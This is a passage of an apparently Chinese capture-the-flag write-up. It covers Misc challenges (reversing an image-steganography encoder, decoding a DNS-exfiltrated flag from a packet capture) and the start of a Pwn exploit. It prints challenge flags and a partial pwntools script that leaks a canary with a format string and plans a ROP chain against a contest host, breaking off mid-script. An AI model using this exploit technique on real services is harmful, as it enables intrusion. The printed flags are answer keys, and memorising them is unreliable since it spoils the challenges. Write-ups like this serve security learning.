</span></span><br><span class="line"><span class="comment"> * ___#######__######_######_#########___######___ </span></span><br><span class="line"><span class="comment"> * ___#######____##__######___######_____######___ </span></span><br><span class="line"><span class="comment"> * ___#######________######____#####_____#####____ </span></span><br><span class="line"><span class="comment"> * ____######________#####_____#####_____####_____ </span></span><br><span class="line"><span class="comment"> * _____#####________####______#####_____###______ </span></span><br><span class="line"><span class="comment"> * ______#####______;###________###______#________ </span></span><br><span class="line"><span class="comment"> * ________##_______####________####______________ </span></span><br><span class="line"><span class="comment"> * 来自公主的祝福</span></span><br><span class="line"><span class="comment"> *  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//      ┏┛ ┻━━━━━┛ ┻┓</span></span><br><span class="line"><span class="comment">//      ┃　　　　　　 ┃</span></span><br><span class="line"><span class="comment">//      ┃　　　━　　　┃</span></span><br><span class="line"><span class="comment">//      ┃　┳┛　  ┗┳　┃</span></span><br><span class="line"><span class="comment">//      ┃　　　　　　 ┃</span></span><br><span class="line"><span class="comment">//      ┃　　　┻　　　┃</span></span><br><span class="line"><span class="comment">//      ┃　　　　　　 ┃</span></span><br><span class="line"><span class="comment">//      ┗━┓　　　┏━━━┛</span></span><br><span class="line"><span class="comment">//        ┃　　　┃   神兽保佑</span></span><br><span class="line"><span class="comment">//        ┃　　　┃   代码无BUG！</span></span><br><span class="line"><span class="comment">//        ┃　　　┗━━━━━━━━━┓</span></span><br><span class="line"><span class="comment">//        ┃　　　　　　　    ┣┓</span></span><br><span class="line"><span class="comment">//        ┃　　　　         ┏┛</span></span><br><span class="line"><span class="comment">//        ┗━┓ ┓ ┏━━━┳ ┓ ┏━┛</span></span><br><span class="line"><span class="comment">//          ┃ ┫ ┫   ┃ ┫ ┫</span></span><br><span class="line"><span class="comment">//          ┗━┻━┛   ┗━┻━┛</span></span><br><span class="line"><span class="comment">// code address:./6YC46L2p/55qE/5Luj56CB55uu5b2V/asdasdasdasd.min.js</span></span><br></pre></td></tr></table></figure>
<p>这应该就是上文讲到的压缩了的代码了<code>/6YC46L2p/55qE/5Luj56CB55uu5b2V/asdasdasdasd.min.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encode</span>(<span class="params">e,r,n,a,i</span>)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> o=[],t=[],f=fs.<span class="title function_">readFileSync</span>(r),g=fs.<span class="title function_">readFileSync</span>(n),s=<span class="keyword">new</span> <span class="title function_">pp</span>(f),d=<span class="keyword">new</span> <span class="title function_">pp</span>(g),h=s.<span class="title function_">size</span>(),c=h.<span class="property">width</span>*h.<span class="property">height</span>,l=(<span class="keyword">new</span> <span class="title class_">Buffer</span>(<span class="number">4</span>*c),<span class="number">0</span>);l&lt;e.<span class="property">length</span>;l++)<span class="keyword">for</span>(v=<span class="title class_">Math</span>.<span class="title function_">floor</span>(c*<span class="title class_">Math</span>.<span class="title function_">random</span>());;)&#123;<span class="keyword">if</span>(!o.<span class="title function_">includes</span>(v))&#123;o.<span class="title function_">push</span>(v),t.<span class="title function_">push</span>(l);<span class="keyword">break</span>&#125;v=(v+<span class="number">1</span>)%<span class="title class_">Math</span>.<span class="title function_">floor</span>(c)&#125;<span class="keyword">for</span>(l=<span class="number">0</span>;l&lt;h.<span class="property">height</span>;l++)<span class="keyword">for</span>(<span class="keyword">var</span> p=<span class="number">0</span>;p&lt;h.<span class="property">width</span>;p++)&#123;<span class="keyword">var</span> u=o.<span class="title function_">findIndex</span>(<span class="keyword">function</span>(<span class="params">e</span>)&#123;<span class="keyword">return</span> e===l*h.<span class="property">width</span>+p&#125;),b=t[u];<span class="keyword">if</span>(-<span class="number">1</span>!==u)&#123;<span class="keyword">var</span> v=s.<span class="title function_">get</span>(p,l);<span class="number">100</span>*<span class="title class_">Math</span>.<span class="title function_">random</span>()&gt;<span class="number">50</span>&amp;&amp;!o.<span class="title function_">includes</span>(p*h.<span class="property">width</span>+l)?(s.<span class="title function_">set</span>(p,l,&#123;<span class="attr">r</span>:<span class="number">255</span>-v.<span class="property">r</span>,<span class="attr">g</span>:<span class="number">255</span>-v.<span class="property">g</span>,<span class="attr">b</span>:<span class="number">255</span>-v.<span class="property">b</span>,<span class="attr">a</span>:v.<span class="property">a</span>&#125;),d.<span class="title function_">set</span>(l,p,&#123;<span class="attr">r</span>:v.<span class="property">r</span>,<span class="attr">g</span>:b,<span class="attr">b</span>:e.<span class="title function_">charCodeAt</span>(b)&#125;)):(s.<span class="title function_">set</span>(p,l,&#123;<span class="attr">r</span>:v.<span class="property">r</span>,<span class="attr">g</span>:b,<span class="attr">b</span>:<span class="number">255</span>-v.<span class="property">b</span>,<span class="attr">a</span>:v.<span class="property">a</span>&#125;),d.<span class="title function_">set</span>(p,l,&#123;<span class="attr">r</span>:v.<span class="property">r</span>,<span class="attr">g</span>:e.<span class="title function_">charCodeAt</span>(b),<span class="attr">b</span>:v.<span class="property">b</span>,<span class="attr">a</span>:v.<span class="property">a</span>&#125;))&#125;&#125;s.<span class="title function_">save</span>(a,<span class="keyword">function</span>(<span class="params">e</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(e)&#125;),d.<span class="title function_">save</span>(i,<span class="keyword">function</span>(<span class="params">e</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(e)&#125;)&#125;<span class="keyword">var</span> pp=<span class="built_in">require</span>(<span class="string">&quot;png-img&quot;</span>),fs=<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>),flag=<span class="string">&quot;5L2g5LiN5Lya5Lul5Li66L+Z5piv562U5qGI5ZCnPw==&quot;</span>;<span class="title function_">encode</span>(flag,<span class="string">&quot;1.png&quot;</span>,<span class="string">&quot;ks.png&quot;</span>,<span class="string">&quot;dest.png&quot;</span>,<span class="string">&quot;key.png&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>下载文件<code>woyaogaoshiqing.gaoshiqing</code>美化一下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encode</span>(<span class="params">flag, path, keySrc, dest, dest2</span>) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> used = [], relPosition = [], jpegData = fs.<span class="title function_">readFileSync</span>(path), ks = fs.<span class="title function_">readFileSync</span>(keySrc), pngtool = <span class="keyword">new</span> <span class="title function_">pp</span>(jpegData), key = <span class="keyword">new</span> <span class="title function_">pp</span>(ks), picSize = pngtool.<span class="title function_">size</span>(), pixelNum = picSize.<span class="property">width</span> * picSize.<span class="property">height</span>, i = (<span class="keyword">new</span> <span class="title class_">Buffer</span>(<span class="number">4</span> * pixelNum), <span class="number">0</span>); i &lt; flag.<span class="property">length</span>; i++) </span><br><span class="line">		<span class="keyword">for</span> (temp = <span class="title class_">Math</span>.<span class="title function_">floor</span>(pixelNum * <span class="title class_">Math</span>.<span class="title function_">random</span>());;) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!used.<span class="title function_">includes</span>(temp)) &#123;</span><br><span class="line">				used.<span class="title function_">push</span>(temp), relPosition.<span class="title function_">push</span>(i);</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">			temp = (temp + <span class="number">1</span>) % <span class="title class_">Math</span>.<span class="title function_">floor</span>(pixelNum)</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; picSize.<span class="property">height</span>; i++) </span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; picSize.<span class="property">width</span>; j++) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">var</span> addrIndex = used.<span class="title function_">findIndex</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> item === i * picSize.<span class="property">width</span> + j</span><br><span class="line">			&#125;),</span><br><span class="line">			flagIndex = relPosition[addrIndex];</span><br><span class="line">			<span class="keyword">if</span> (-<span class="number">1</span> !== addrIndex) </span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">var</span> temp = pngtool.<span class="title function_">get</span>(j, i);</span><br><span class="line">				<span class="number">100</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">50</span> &amp;&amp; !used.<span class="title function_">includes</span>(j * picSize.<span class="property">width</span> + i) ? (</span><br><span class="line">					pngtool.<span class="title function_">set</span>(j, i, &#123;</span><br><span class="line">					<span class="attr">r</span>: <span class="number">255</span> - temp.<span class="property">r</span>,</span><br><span class="line">					<span class="attr">g</span>: <span class="number">255</span> - temp.<span class="property">g</span>,</span><br><span class="line">					<span class="attr">b</span>: <span class="number">255</span> - temp.<span class="property">b</span>,</span><br><span class="line">					<span class="attr">a</span>: temp.<span class="property">a</span></span><br><span class="line">				&#125;), key.<span class="title function_">set</span>(i, j, &#123;</span><br><span class="line">					<span class="attr">r</span>: temp.<span class="property">r</span>,</span><br><span class="line">					<span class="attr">g</span>: flagIndex,</span><br><span class="line">					<span class="attr">b</span>: flag.<span class="title function_">charCodeAt</span>(flagIndex)</span><br><span class="line">				&#125;)) </span><br><span class="line"></span><br><span class="line">				: </span><br><span class="line"></span><br><span class="line">				(</span><br><span class="line">					pngtool.<span class="title function_">set</span>(j, i, &#123;</span><br><span class="line">					<span class="attr">r</span>: temp.<span class="property">r</span>,</span><br><span class="line">					<span class="attr">g</span>: flagIndex,</span><br><span class="line">					<span class="attr">b</span>: <span class="number">255</span> - temp.<span class="property">b</span>,    </span><br><span class="line">					<span class="attr">a</span>: temp.<span class="property">a</span></span><br><span class="line">				&#125;), key.<span class="title function_">set</span>(j, i, &#123;</span><br><span class="line">					<span class="attr">r</span>: temp.<span class="property">r</span>,</span><br><span class="line">					<span class="attr">g</span>: flag.<span class="title function_">charCodeAt</span>(flagIndex),</span><br><span class="line">					<span class="attr">b</span>: temp.<span class="property">b</span>,</span><br><span class="line">					<span class="attr">a</span>: temp.<span class="property">a</span></span><br><span class="line">				&#125;))</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	pngtool.<span class="title function_">save</span>(dest, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">	&#125;), key.<span class="title function_">save</span>(dest2, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> pp = <span class="built_in">require</span>(<span class="string">&quot;png-img&quot;</span>),</span><br><span class="line">	fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>),</span><br><span class="line">	flag = <span class="string">&quot;5L2g5LiN5Lya5Lul5Li66L+Z5piv562U5qGI5ZCnPw==&quot;</span>;</span><br><span class="line"><span class="title function_">encode</span>(flag, <span class="string">&quot;1.png&quot;</span>, <span class="string">&quot;ks.png&quot;</span>, <span class="string">&quot;dest.png&quot;</span>, <span class="string">&quot;key.png&quot;</span>);</span><br><span class="line"><span class="comment">//如果你找到了这个文件，恭喜你，就真的成送分题了</span></span><br></pre></td></tr></table></figure>
<p>很明显这一段是nodejs代码，根据1.png和ks.png以及flag生成了dest.png，key.png<br>嗯。。。目前我手上只有三张图（没有ks.png），所以算法一定是可逆的,写decode函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">decode</span>(<span class="params">path, dest, dest2</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=[];</span><br><span class="line">	<span class="keyword">var</span> relPosition = [], </span><br><span class="line">	 f1 = fs.<span class="title function_">readFileSync</span>(path), </span><br><span class="line">	 d1 = fs.<span class="title function_">readFileSync</span>(dest), </span><br><span class="line">	 d2 = fs.<span class="title function_">readFileSync</span>(dest2),</span><br><span class="line">	 ff1 = <span class="keyword">new</span> <span class="title function_">pp</span>(f1), </span><br><span class="line">	 dd1 = <span class="keyword">new</span> <span class="title function_">pp</span>(d1), </span><br><span class="line">	 key = <span class="keyword">new</span> <span class="title function_">pp</span>(d2),</span><br><span class="line">	 picSize = ff1.<span class="title function_">size</span>(), </span><br><span class="line">	 pixelNum = picSize.<span class="property">width</span> * picSize.<span class="property">height</span>;</span><br><span class="line">	 <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; picSize.<span class="property">height</span>; i++) </span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; picSize.<span class="property">width</span>; j++) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">var</span> t1=ff1.<span class="title function_">get</span>(j, i);</span><br><span class="line">			<span class="keyword">var</span> t2=dd1.<span class="title function_">get</span>(j,i);</span><br><span class="line">			<span class="keyword">if</span>((t1.<span class="property">b</span>-t2.<span class="property">b</span>)!=<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>((t1.<span class="property">r</span>-t2.<span class="property">r</span>)==<span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">var</span> k1=key.<span class="title function_">get</span>(j,i);</span><br><span class="line">					flag[t2.<span class="property">g</span>]=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(k1.<span class="property">g</span>);</span><br><span class="line"></span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">var</span> k1=key.<span class="title function_">get</span>(i,j);</span><br><span class="line">					flag[k1.<span class="property">g</span>]=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(k1.<span class="property">b</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">decode</span>(<span class="string">&quot;1.png&quot;</span>,<span class="string">&quot;dest.png&quot;</span>,<span class="string">&quot;key.png&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>得到flag为<code>b25seSBjYXQgd2lsbCBkZWNvZGUgdGhpczIzMzMzMzM=</code>我偏要解码一下<code>only cat will decode this2333333</code><br><strong>P.S. 果然程序员小哥哥都是闷骚型，不过打CTF的妹子可能真的有哦#（滑稽）</strong></p>
<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>私信微博公众号”三叶草小组Syclover”<code>我要抢一血flag</code>得到flag<code>SYC&#123;598137ff6a8f593e8ea02b6eed738f50&#125;</code></p>
<h3 id="藏着东西的流量包"><a href="#藏着东西的流量包" class="headerlink" title="藏着东西的流量包"></a>藏着东西的流量包</h3><p>不得不说，你们的套路太深了。。。90多M的流量包，我愣是过滤了5小时（还是我太菜了吧），那么多的DNS被我写的过滤语句第一个就过滤了…………<br>给你们看看我失败的过滤语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http&amp;&amp;ip.src!=111.206.222.249&amp;&amp;ip.src!=61.135.169.121&amp;&amp;ip.src!=119.39.204.33&amp;&amp;ip.src!=223.252.199.10&amp;&amp;ip.src!=59.111.160.195&amp;&amp;ip.src!=59.111.160.197&amp;&amp;ip.src!=119.39.204.32&amp;&amp;ip.dst!=111.206.222.249&amp;&amp;ip.dst!=61.135.169.121&amp;&amp;ip.dst!=119.39.204.33&amp;&amp;ip.dst!=223.252.199.10&amp;&amp;ip.dst!=59.111.160.195&amp;&amp;ip.dst!=59.111.160.197&amp;&amp;ip.dst!=119.39.204.32&amp;&amp;ip.src!=113.207.0.118&amp;&amp;ip.dst!=113.207.0.118&amp;&amp;ip.src!=113.200.193.62&amp;&amp;ip.dst!=113.200.193.62&amp;&amp;ip.src!=113.207.42.117&amp;&amp;ip.dst!=113.207.42.117&amp;&amp;ip.src!=175.154.189.30&amp;&amp;ip.dst!=175.154.189.30&amp;&amp;ip.src!=123.58.180.117&amp;&amp;ip.dst!=123.58.180.117&amp;&amp;ip.src!=113.207.39.7&amp;&amp;ip.dst!=113.207.39.7&amp;&amp;ip.src!=113.207.45.123&amp;&amp;ip.dst!=113.207.45.123&amp;&amp;ip.src!=113.207.42.58&amp;&amp;ip.dst!=113.207.42.58&amp;&amp;ip.src!=113.207.42.118&amp;&amp;ip.dst!=113.207.42.118&amp;&amp;ip.src!=163.177.72.159&amp;&amp;ip.dst!=163.177.72.159&amp;&amp;ip.src!=113.207.53.31&amp;&amp;ip.dst!=113.207.53.31&amp;&amp;ip.src!=163.177.89.163&amp;&amp;ip.dst!=163.177.89.163&amp;&amp;ip.src!=123.138.42.48&amp;&amp;ip.dst!=123.138.42.48&amp;&amp;ip.src!=61.135.185.159&amp;&amp;ip.dst!=61.135.185.159&amp;&amp;ip.src!=106.39.162.29&amp;&amp;ip.dst!=106.39.162.29&amp;&amp;ip.src!=221.204.226.158&amp;&amp;ip.dst!=221.204.226.158&amp;&amp;ip.src!=42.120.219.93&amp;&amp;ip.dst!=42.120.219.93&amp;&amp;ip.src!=113.207.42.114&amp;&amp;ip.dst!=113.207.42.114&amp;&amp;ip.src!=202.108.23.152&amp;&amp;ip.dst!=202.108.23.152&amp;&amp;ip.src!=27.221.30.109&amp;&amp;ip.dst!=27.221.30.109&amp;&amp;ip.src!=123.56.20.66&amp;&amp;ip.dst!=123.56.20.66&amp;&amp;ip.src!=43.254.53.187&amp;&amp;ip.dst!=43.254.53.187&amp;&amp;ip.src!=27.221.28.197&amp;&amp;ip.dst!=27.221.28.197&amp;&amp;ip.src!=123.126.104.122&amp;&amp;ip.dst!=123.126.104.122&amp;&amp;ip.src!=117.25.155.158&amp;&amp;ip.dst!=117.25.155.158&amp;&amp;ip.src!=119.6.229.39&amp;&amp;ip.dst!=119.6.229.39&amp;&amp;ip.src!=123.138.67.63&amp;&amp;ip.dst!=123.138.67.63&amp;&amp;ip.src!=123.138.67.81&amp;&amp;ip.dst!=123.138.67.81&amp;&amp;ip.src!=27.221.28.191&amp;&amp;ip.dst!=27.221.28.191&amp;&amp;ip.src!=60.217.249.114&amp;&amp;ip.dst!=60.217.249.114&amp;&amp;ip.src!=117.25.155.162&amp;&amp;ip.dst!=117.25.155.162&amp;&amp;ip.src!=123.125.116.12&amp;&amp;ip.dst!=123.125.116.12&amp;&amp;ip.src!=117.25.155.158&amp;&amp;ip.dst!=117.25.155.158&amp;&amp;ip.src!=123.126.104.243&amp;&amp;ip.dst!=123.126.104.243&amp;&amp;ip.src!=61.135.186.152&amp;&amp;ip.dst!=61.135.186.152&amp;&amp;ip.src!=54.223.225.178&amp;&amp;ip.dst!=54.223.225.178&amp;&amp;ip.src!=23.37.139.27&amp;&amp;ip.dst!=23.37.139.27&amp;&amp;ip.src!=42.156.140.84&amp;&amp;ip.dst!=42.156.140.84&amp;&amp;ip.src!=61.135.169.125&amp;&amp;ip.dst!=61.135.169.125&amp;&amp;ip.src!=210.22.60.183&amp;&amp;ip.dst!=210.22.60.183&amp;&amp;ip.src!=101.69.131.13&amp;&amp;ip.dst!=101.69.131.13&amp;&amp;ip.src!=112.80.255.92&amp;&amp;ip.dst!=112.80.255.92&amp;&amp;ip.src!=123.138.42.31&amp;&amp;ip.dst!=123.138.42.31&amp;&amp;ip.src!=113.200.91.218&amp;&amp;ip.dst!=113.200.91.218&amp;&amp;ip.src!=27.221.106.16&amp;&amp;ip.dst!=27.221.106.16&amp;&amp;ip.src!=27.221.30.105&amp;&amp;ip.dst!=27.221.30.105&amp;&amp;ip.src!=42.236.9.101&amp;&amp;ip.dst!=42.236.9.101&amp;&amp;ip.src!=54.223.84.128&amp;&amp;ip.dst!=54.223.84.128&amp;&amp;ip.src!=119.6.229.38&amp;&amp;ip.dst!=119.6.229.38</span><br></pre></td></tr></table></figure>
<p>感觉出题的人就是写了个脚本，疯狂请求dns，然后自己打开了网易云音乐、B站、A站、嘀哩嘀哩……..基本上所有的http请求都是垃圾的除了一条</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src==192.168.236.1||ip.dst==192.168.236.1</span><br></pre></td></tr></table></figure>
<p>这里能找到一个key.zip<br>得到key<code>syc10v3r</code>交了一下。。。嗯。。。不对<br>继续看吧。。发现<strong>dns请求很奇怪</strong>。。。都是<strong>4位字符.hacker.com</strong><br>挨个写下来<br><code>VTJGc2RHVmtYMStpNFMxc29pci9SVDZtb3RTSmRnTFFDRzVNWlRlbG9nckVPQStoeE5MWEVDbHI4WUpoYWx1Yw==</code><br>base64解码一次<br><code>U2FsdGVkX1+i4S1soir/RT6motSJdgLQCG5MZTelogrEOA+hxNLXEClr8YJhaluc</code><br>用上面的<code>key</code>解AES<br>得到flag<br><code>SYC&#123;0h_0h_0h_dns&#125;</code><br>在这题中我学习了新套路，重点是还收获了出题人常去的网站。。。嗯这波不亏（B站基佬千千万~）</p>
<h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>5星好评哦(づ￣3￣)づ╭❤～flag<code>SYC&#123;8bbb5314821d02dc5fcbc2f4eb5a8013&#125;</code></p>
<h2 id="0x02-Pwn"><a href="#0x02-Pwn" class="headerlink" title="0x02 Pwn"></a>0x02 Pwn</h2><h3 id="fileShare"><a href="#fileShare" class="headerlink" title="fileShare"></a>fileShare</h3><h4 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h4><p>程序全开保护</p>
<h4 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h4><p>有两处漏洞</p>
<ol>
<li>sprintf格式化</li>
<li>栈溢出</li>
</ol>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>格式化只能一次，于是考虑溢出canary，然后利用栈溢出进行rop</p>
<h5 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h5><p>由于所有保护全开，rop前需要先得到程序加载的地址，这里一并通过sprintf溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span> + <span class="string">&quot;_%26$llx_%30$llx_&quot;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">leav_message(payload)</span><br></pre></td></tr></table></figure>

<h5 id="code"><a href="#code" class="headerlink" title="code"></a>code</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys</span><br><span class="line"></span><br><span class="line">elf_name = <span class="string">&quot;./pwn200&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#retmote args</span></span><br><span class="line">remote_host = <span class="string">&quot;54.222.255.223&quot;</span></span><br><span class="line">remote_port = <span class="number">50002</span></span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">elf = ELF(elf_name)</span><br><span class="line"></span><br><span class="line">io = remote(remote_host, remote_port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlySend</span>(<span class="params">sdstr</span>):</span><br><span class="line">    io.send(sdstr)</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mmenu</span>(<span class="params">mindex</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Leave a message\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(mindex))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mLogin</span>(<span class="params">content</span>):</span><br><span class="line">    mmenu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    dlySend(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">f_name</span>):</span><br><span class="line">    mmenu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;input the filename:&quot;</span>)</span><br><span class="line">    dlySend(f_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leav_message</span>(<span class="params">mmessg</span>):</span><br><span class="line">    mmenu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your msg:&quot;</span>)</span><br><span class="line">    dlySend(mmessg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_exp</span>():</span><br><span class="line">    rd_flag_off = <span class="number">0x626</span></span><br><span class="line">    sfmt_n = sys.argv[<span class="number">1</span>]</span><br><span class="line">    mLogin(<span class="string">&quot;aa&quot;</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span> + <span class="string">&quot;_%26$llx_%30$llx_%&quot;</span> + sfmt_n + <span class="string">&quot;$llx_&quot;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    leav_message(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;1&quot;</span>*<span class="number">8</span>+<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">    data = io.recvuntil(<span class="string">&quot;_&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    lk_canary = <span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&quot;canary data: &quot;</span>+<span class="built_in">hex</span>(lk_canary))</span><br><span class="line">    data = io.recvuntil(<span class="string">&quot;_&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    lk_mainVuln = <span class="built_in">int</span>(data, <span class="number">16</span>) - <span class="number">0xE3</span></span><br><span class="line">    log.info(<span class="string">&quot;main vuln addr: &quot;</span>+<span class="built_in">hex</span>(lk_mainVuln))</span><br><span class="line">    rd_flg_addr = lk_mainVuln - rd_flag_off</span><br><span class="line">    log.info(<span class="string">&quot;rd flag addr: &quot;</span>+<span class="built_in">hex</span>(rd_flg_addr))</span><br><span class="line">    <span 